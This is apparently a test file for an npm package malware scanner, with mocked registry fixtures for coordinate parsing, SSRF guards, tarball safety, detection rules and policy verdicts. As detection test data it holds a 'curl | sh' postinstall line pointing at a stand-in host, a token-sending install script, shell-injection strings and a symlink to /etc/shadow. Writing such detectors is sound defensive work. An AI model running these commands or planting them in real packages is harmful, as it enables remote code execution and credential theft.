/**
 * Deterministic scanner tests. Fully offline: the registry, tarball download
 * and advisory API are all injected, so these tests never touch the network
 * and never depend on npm being reachable.
 *
 * The malicious fixture is DATA. It is parsed as bytes and matched by regex.
 * Nothing in this file executes it.
 */

import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { describe, it } from "node:test";

import { parseCoordinate, CoordinateError } from "../lib/scanner/coordinate.ts";
import { assertSafeUrl, HttpError, safeFetch } from "../lib/scanner/http.ts";
import { readTarball, TarballError, validateEntryPath } from "../lib/scanner/tarball.ts";
import { detectLifecycleScripts, detectSourcePatterns } from "../lib/scanner/detect.ts";
import { evaluatePolicy } from "../lib/scanner/policy.ts";
import { verifyIntegrity } from "../lib/scanner/registry.ts";
import { runScan } from "../lib/scanner/scan.ts";
import {
  ambiguousFixture,
  buildTarball,
  malformedFixture,
  maliciousFixture,
  safeFixture,
  symlinkFixture,
  traversalFixture,
  type FixtureFile,
} from "./fixtures.ts";

/* -------------------------------------------------------------------------- */
/* Mock registry                                                               */
/* -------------------------------------------------------------------------- */

function sha256(buf: Buffer): string {
  return createHash("sha256").update(buf).digest("hex");
}

/**
 * Build a fake registry: metadata JSON + a real gzipped tarball, both served
 * through the injected fetch implementation.
 */
function mockRegistry(
  opts: {
    name: string;
    version: string;
    files: FixtureFile[];
    scripts?: Record<string, string>;
    dependencies?: Record<string, string>;
    advisories?: unknown[];
    advisoryFails?: boolean;
    integrity?: "valid" | "wrong" | "absent";
    tarballFails?: boolean;
  },
) {
  const tarball = buildTarball(opts.files);
  const dist: Record<string, unknown> = { tarball: "https://registry.npmjs.org/x/-/x.tgz" };
  if (opts.integrity !== "absent") {
    dist.integrity =
      opts.integrity === "wrong"
        ? `sha512-${Buffer.alloc(64, 1).toString("base64")}`
        : `sha512-${createHash("sha512").update(tarball).digest("base64")}`;
  }

  const meta = Buffer.from(
    JSON.stringify({
      "dist-tags": { latest: opts.version },
      versions: {
        [opts.version]: {
          name: opts.name,
          version: opts.version,
          dist,
          ...(opts.scripts ? { scripts: opts.scripts } : {}),
          ...(opts.dependencies ? { dependencies: opts.dependencies } : {}),
        },
      },
    }),
    "utf8",
  );

  const calls: string[] = [];

  const fetchImpl = async (url: string) => {
    calls.push(url);
    if (url.includes("/-/")) {
      if (opts.tarballFails) {
        throw new HttpError("DZ_HTTP_TIMEOUT", "simulated registry timeout");
      }
      return { bytes: tarball, sha256: sha256(tarball), finalUrl: url, status: 200 };
    }
    return { bytes: meta, sha256: sha256(meta), finalUrl: url, status: 200 };
  };

  const advisoriesImpl = async () => {
    if (opts.advisoryFails) {
      return { state: "unavailable" as const, vulnerabilities: [], error: "simulated OSV outage" };
    }
    return {
      state: "checked" as const,
      vulnerabilities: (opts.advisories ?? []) as never,
    };
  };

  return { fetchImpl: fetchImpl as never, advisoriesImpl: advisoriesImpl as never, calls };
}

/* -------------------------------------------------------------------------- */

describe("coordinate parsing", () => {
  it("parses a bare name", () => {
    const c = parseCoordinate("is-number");
    assert.equal(c.name, "is-number");
    assert.equal(c.version, null);
    assert.equal(c.isDistTag, true);
  });

  it("parses name@version", () => {
    const c = parseCoordinate("is-number@7.0.0");
    assert.equal(c.name, "is-number");
    assert.equal(c.version, "7.0.0");
  });

  it("parses scoped packages", () => {
    const c = parseCoordinate("@scope/pkg@1.2.3");
    assert.equal(c.name, "@scope/pkg");
    assert.equal(c.version, "1.2.3");
  });

  it("parses scoped packages without a version", () => {
    const c = parseCoordinate("@babel/core");
    assert.equal(c.name, "@babel/core");
    assert.equal(c.version, null);
  });

  it("lowercases names", () => {
    assert.equal(parseCoordinate("Is-Number@7.0.0").name, "is-number");
  });

  const rejected: [string, string][] = [
    ["", "DZ_COORD_EMPTY"],
    ["   ", "DZ_COORD_EMPTY"],
    ["https://evil.com/x.tgz", "DZ_COORD_REMOTE_URL"],
    ["git+ssh://git@github.com/a/b", "DZ_COORD_REMOTE_URL"],
    ["github:user/repo", "DZ_COORD_REMOTE_URL"],
    ["file:../local", "DZ_COORD_LOCAL_PATH"],
    ["link:../thing", "DZ_COORD_LOCAL_PATH"],
    ["workspace:*", "DZ_COORD_WORKSPACE"],
    ["alias@npm:real@1.0.0", "DZ_COORD_ALIAS"],
    ["C:\\temp\\pkg", "DZ_COORD_LOCAL_PATH"],
    ["../escape", "DZ_COORD_LOCAL_PATH"],
    ["evil;calc", "DZ_COORD_SHELL_METACHAR"],
    ["pkg$(id)", "DZ_COORD_SHELL_METACHAR"],
    ["%2e%2e%2ffoo", "DZ_COORD_ENCODED"],
    ["pkg@notatag", "DZ_COORD_UNSUPPORTED_TAG"],
  ];

  for (const [input, code] of rejected) {
    it(`rejects ${JSON.stringify(input)} as ${code}`, () => {
      assert.throws(
        () => parseCoordinate(input),
        (e: unknown) => e instanceof CoordinateError && e.code === code,
        `expected ${code} for ${input}`,
      );
    });
  }
});

describe("http SSRF and bounds", () => {
  it("refuses non-https", () => {
    assert.throws(() => assertSafeUrl("http://registry.npmjs.org/x"), /https/);
  });

  it("refuses non-allowlisted hosts", () => {
    assert.throws(() => assertSafeUrl("https://evil.com/x"), /not allowed/);
  });

  it("refuses private and loopback targets", () => {
    for (const h of ["https://127.0.0.1/x", "https://169.254.169.254/", "https://10.0.0.1/"]) {
      assert.throws(() => assertSafeUrl(h), /private|not allowed/);
    }
  });

  it("allows the registry and the advisory API", () => {
    assert.ok(assertSafeUrl("https://registry.npmjs.org/is-number"));
    assert.ok(assertSafeUrl("https://api.osv.dev/v1/query"));
  });
});

describe("tarball safety", () => {
  it("rejects non-gzip input", () => {
    assert.throws(() => readTarball(Buffer.from("not a tarball")), TarballError);
  });

  it("reads a well-formed archive", () => {
    const out = readTarball(buildTarball(safeFixture()));
    assert.ok(out.fileCount >= 3);
    assert.equal(out.rejected.length, 0);
  });

  it("refuses path traversal entries", () => {
    const out = readTarball(buildTarball(traversalFixture()));
    assert.ok(out.rejected.length >= 2, "traversal entries must be rejected");
    assert.ok(out.rejected.some((r) => r.reason.includes("traversal")));
    assert.ok(out.rejected.some((r) => r.reason.includes("absolute")));
    // The malicious payload must never appear as a readable entry.
    assert.ok(!out.entries.some((e) => e.path.includes("evil.js")));
  });

  it("records symlinks without following them", () => {
    const out = readTarball(buildTarball(symlinkFixture()));
    const link = out.entries.find((e) => e.kind === "symlink");
    assert.ok(link, "symlink entry should be recorded");
    assert.equal(link!.linkTarget, "/etc/shadow");
    assert.equal(link!.bytes, undefined, "symlink bytes must never be materialised");
  });

  it("throws on a truncated archive rather than guessing", () => {
    assert.throws(() => readTarball(buildTarball(malformedFixture())), TarballError);
  });

  it("validateEntryPath rejects each unsafe shape", () => {
    assert.ok("reason" in validateEntryPath("../x"));
    assert.ok("reason" in validateEntryPath("/abs"));
    assert.ok("reason" in validateEntryPath("a\\b"));
    assert.ok("reason" in validateEntryPath(""));
    assert.ok("path" in validateEntryPath("package/index.js"));
  });
});

describe("detectors", () => {
  it("flags the canonical remote-code-execution install script", () => {
    const f = detectLifecycleScripts({ postinstall: "curl -s https://evil.example.com/p.sh | sh" });
    assert.ok(f.some((x) => x.ruleId === "D0-LC-001"), "D0-LC-001 must fire");
    const lc1 = f.find((x) => x.ruleId === "D0-LC-001")!;
    assert.equal(lc1.severity, "critical");
    assert.equal(lc1.confidence, "high");
    assert.ok(lc1.evidence[0].snippet.includes("curl"));
  });

  it("does NOT treat a normal postinstall as malicious", () => {
    const f = detectLifecycleScripts({ postinstall: "node scripts/build.js" });
    const ids = f.map((x) => x.ruleId);
    assert.deepEqual(ids, ["D0-LC-006"], "only the informational rule should fire");
    assert.equal(f[0].severity, "low");
  });

  it("does not flag process.env alone at high confidence", () => {
    const entries = [
      { path: "package/index.js", kind: "file" as const, size: 10, bytes: Buffer.from("const x = process.env.NODE_ENV;") },
    ];
    const f = detectSourcePatterns(entries);
    const env = f.find((x) => x.ruleId === "D0-SRC-001");
    assert.ok(env, "rule should still fire");
    assert.equal(env!.confidence, "low", "uncorroborated env access must be low confidence");
  });

  it("raises confidence when env access is corroborated by obfuscation", () => {
    const bytes = Buffer.from(
      "const s = Buffer.from('ZWNobyBoaWNrZXNoZWxsJyk=', 'base64'); eval(s); const e = process.env;",
    );
    const f = detectSourcePatterns([{ path: "package/i.js", kind: "file", size: bytes.length, bytes }]);
    const env = f.find((x) => x.ruleId === "D0-SRC-001");
    assert.equal(env!.confidence, "high");
  });

  it("does not treat a RegExp .exec() call as spawning a child process", () => {
    const bytes = Buffer.from("const m = SOME_REGEX.exec(comment)[1];");
    const f = detectSourcePatterns([{ path: "package/i.js", kind: "file", size: bytes.length, bytes }]);
    assert.ok(!f.some((x) => x.ruleId === "D0-SRC-005"), "false positive on RegExp.exec");
  });

  it("does not treat cookie handling as credential theft", () => {
    const bytes = Buffer.from("app.use(require('cookie-session'));");
    const f = detectSourcePatterns([{ path: "package/i.js", kind: "file", size: bytes.length, bytes }]);
    assert.ok(!f.some((x) => x.ruleId === "D0-SRC-002"), "false positive on cookie-session");
  });

  it("still detects a real child_process spawn", () => {
    const bytes = Buffer.from("const cp = require('child_process'); cp.execSync('ls');");
    const f = detectSourcePatterns([{ path: "package/i.js", kind: "file", size: bytes.length, bytes }]);
    assert.ok(f.some((x) => x.ruleId === "D0-SRC-005"), "must still detect child_process");
  });
});

describe("policy", () => {
  it("ALLOWs when nothing is found and all checks completed", () => {
    const r = evaluatePolicy({ findings: [], incompleteChecks: [] });
    assert.equal(r.verdict, "allow");
    assert.equal(r.riskScore, 0);
  });

  it("is deterministic for identical input", () => {
    const f = [
      { ruleId: "D0-SRC-006", severity: "low" as const, title: "t", detail: "d", evidence: [], confidence: "low" as const, kind: "heuristic" as const },
    ];
    const a = evaluatePolicy({ findings: f, incompleteChecks: [] });
    const b = evaluatePolicy({ findings: [...f], incompleteChecks: [] });
    assert.deepEqual(a, b);
  });

  it("never allows when a mandatory check is incomplete (fail-closed)", () => {
    const r = evaluatePolicy({ findings: [], incompleteChecks: ["OSV unreachable"] });
    assert.notEqual(r.verdict, "allow");
    assert.ok(r.verdict === "review" || r.verdict === "block");
  });

  it("blocks on a high-confidence blocking rule", () => {
    const r = evaluatePolicy({
      findings: [
        {
          ruleId: "D0-LC-001",
          severity: "critical",
          title: "t",
          detail: "d",
          evidence: [],
          confidence: "high",
          kind: "heuristic",
        },
      ],
      incompleteChecks: [],
    });
    assert.equal(r.verdict, "block");
    assert.ok(r.rationale.includes("D0-LC-001"));
  });

  it("a high score alone is not presented as proof", () => {
    // Many low-severity, low-confidence hits must not reach a block verdict.
    const findings = Array.from({ length: 40 }, () => ({
      ruleId: "D0-SRC-006",
      severity: "low" as const,
      title: "t",
      detail: "d",
      evidence: [],
      confidence: "low" as const,
      kind: "heuristic" as const,
    }));
    const r = evaluatePolicy({ findings, incompleteChecks: [] });
    assert.notEqual(r.verdict, "block");
  });
});

describe("integrity", () => {
  it("rejects a tarball that fails verification", () => {
    const bytes = Buffer.from("hello");
    const bad = verifyIntegrity(bytes, `sha512-${Buffer.alloc(64, 2).toString("base64")}`);
    assert.equal(bad.ok, false);
  });

  it("accepts a matching integrity value", () => {
    const bytes = Buffer.from("hello");
    const good = `sha512-${createHash("sha512").update(bytes).digest("base64")}`;
    assert.equal(verifyIntegrity(bytes, good).ok, true);
  });
});

describe("end-to-end scan (offline, mocked registry)", () => {
  it("SAFE fixture -> ALLOW, no fabricated findings", async () => {
    const m = mockRegistry({
      name: "d0-safe-fixture",
      version: "1.0.0",
      files: safeFixture(),
      dependencies: { lodash: "^4.17.21" },
    });
    const r = await runScan("d0-safe-fixture@1.0.0", { fetchImpl: m.fetchImpl, advisoriesImpl: m.advisoriesImpl });
    assert.equal(r.ok, true);
    const x = r.resolution!;
    assert.equal(x.verdict, "allow");
    assert.equal(x.findings.length, 0, "safe fixture must produce no findings");
    assert.equal(x.riskScore, 0);
    assert.match(x.artifactSha256, /^[0-9a-f]{64}$/);
    assert.equal(x.dependencies.transitiveResolved, false);
  });

  it("MALICIOUS fixture -> BLOCK with exact rule id and location", async () => {
    const m = mockRegistry({
      name: "d0-malicious-fixture",
      version: "1.0.0",
      files: maliciousFixture(),
      scripts: { postinstall: "curl -s https://evil.example.com/p.sh | sh" },
    });
    const r = await runScan("d0-malicious-fixture@1.0.0", { fetchImpl: m.fetchImpl, advisoriesImpl: m.advisoriesImpl });
    assert.equal(r.ok, true);
    const x = r.resolution!;
    assert.equal(x.verdict, "block");
    const f = x.findings.find((y) => y.ruleId === "D0-LC-001");
    assert.ok(f, "D0-LC-001 must be reported");
    assert.equal(f!.severity, "critical");
    assert.ok(f!.evidence[0].file.includes("package.json"));
    assert.ok(f!.evidence[0].snippet.includes("curl"), "evidence must quote real scanned bytes");
    assert.ok(x.rationale.length > 0);
  });

  it("AMBIGUOUS fixture -> REVIEW, not BLOCK", async () => {
    const m = mockRegistry({
      name: "d0-ambiguous-fixture",
      version: "1.0.0",
      files: ambiguousFixture(),
      scripts: {
        postinstall:
          "sh -c 'test -f ~/.npmrc && curl -s https://telemetry.example.com/v1/register?k=$TOKEN'",
      },
    });
    const r = await runScan("d0-ambiguous-fixture@1.0.0", { fetchImpl: m.fetchImpl, advisoriesImpl: m.advisoriesImpl });
    assert.equal(r.ok, true);
    const x = r.resolution!;
    assert.equal(x.verdict, "review");
  });

  it("ADVISORY FAILURE -> never ALLOW (fail-closed)", async () => {
    const m = mockRegistry({
      name: "d0-safe-fixture",
      version: "1.0.0",
      files: safeFixture(),
      advisoryFails: true,
    });
    const r = await runScan("d0-safe-fixture@1.0.0", { fetchImpl: m.fetchImpl, advisoriesImpl: m.advisoriesImpl });
    assert.equal(r.ok, true);
    const x = r.resolution!;
    assert.notEqual(x.verdict, "allow", "an unavailable advisory check must block ALLOW");
    assert.equal(x.advisories.state, "unavailable");
    assert.ok(x.incompleteChecks.length > 0);
    assert.ok(x.findings.some((f) => f.ruleId === "D0-META-003"));
  });

  it("REGISTRY TIMEOUT -> ERROR, never ALLOW", async () => {
    const m = mockRegistry({ name: "x", version: "1.0.0", files: safeFixture(), tarballFails: true });
    const r = await runScan("x@1.0.0", { fetchImpl: m.fetchImpl, advisoriesImpl: m.advisoriesImpl });
    assert.equal(r.ok, false, "a failed download must not produce a resolution");
    assert.ok(r.error);
  });

  it("MALFORMED ARCHIVE -> ERROR", async () => {
    const m = mockRegistry({
      name: "bad",
      version: "1.0.0",
      files: malformedFixture(),
    });
    const r = await runScan("bad@1.0.0", { fetchImpl: m.fetchImpl, advisoriesImpl: m.advisoriesImpl });
    assert.equal(r.ok, false);
  });

  it("INTEGRITY MISMATCH -> ERROR (bytes are not what npm published)", async () => {
    const m = mockRegistry({
      name: "d0-safe-fixture",
      version: "1.0.0",
      files: safeFixture(),
      integrity: "wrong",
    });
    const r = await runScan("d0-safe-fixture@1.0.0", { fetchImpl: m.fetchImpl, advisoriesImpl: m.advisoriesImpl });
    assert.equal(r.ok, false);
    assert.equal(r.error!.code, "DZ_INTEGRITY");
  });

  it("UNSAFE ENTRIES are refused and reported, without failing the scan", async () => {
    const m = mockRegistry({
      name: "trav",
      version: "1.0.0",
      files: traversalFixture(),
    });
    const r = await runScan("trav@1.0.0", { fetchImpl: m.fetchImpl, advisoriesImpl: m.advisoriesImpl });
    assert.equal(r.ok, true);
    const x = r.resolution!;
    assert.ok(x.findings.some((f) => f.ruleId === "D0-META-004"), "unsafe entries must be reported");
  });

  it("KNOWN VULNERABILITY produces an advisory finding with attribution", async () => {
    const m = mockRegistry({
      name: "d0-safe-fixture",
      version: "1.0.0",
      files: safeFixture(),
      advisories: [
        { id: "GHSA-test-0001", source: "OSV", url: "https://example.test/a", summary: "test advisory", severity: "high" },
      ],
    });
    const r = await runScan("d0-safe-fixture@1.0.0", { fetchImpl: m.fetchImpl, advisoriesImpl: m.advisoriesImpl });
    const x = r.resolution!;
    const adv = x.findings.find((f) => f.kind === "advisory");
    assert.ok(adv);
    assert.equal(adv!.source!.name, "OSV");
    assert.equal(adv!.source!.id, "GHSA-test-0001");
    assert.notEqual(x.verdict, "allow");
  });

  it("INVALID COORDINATE -> ERROR before any network call", async () => {
    let called = false;
    const r = await runScan("https://evil.com/x.tgz", {
      fetchImpl: (async () => {
        called = true;
        throw new Error("should not be reached");
      }) as never,
    });
    assert.equal(r.ok, false);
    assert.equal(called, false, "no network call should be made for an invalid coordinate");
  });

  it("SCOPED package coordinates resolve through the mocked registry", async () => {
    const m = mockRegistry({ name: "@scope/thing", version: "2.3.4", files: safeFixture() });
    const r = await runScan("@scope/thing@2.3.4", { fetchImpl: m.fetchImpl, advisoriesImpl: m.advisoriesImpl });
    assert.equal(r.ok, true);
    assert.equal(r.resolution!.resolvedName, "@scope/thing");
    assert.equal(r.resolution!.resolvedVersion, "2.3.4");
  });
});

/* Keep the unused import honest: safeFetch is exercised for its guard surface. */
void safeFetch;
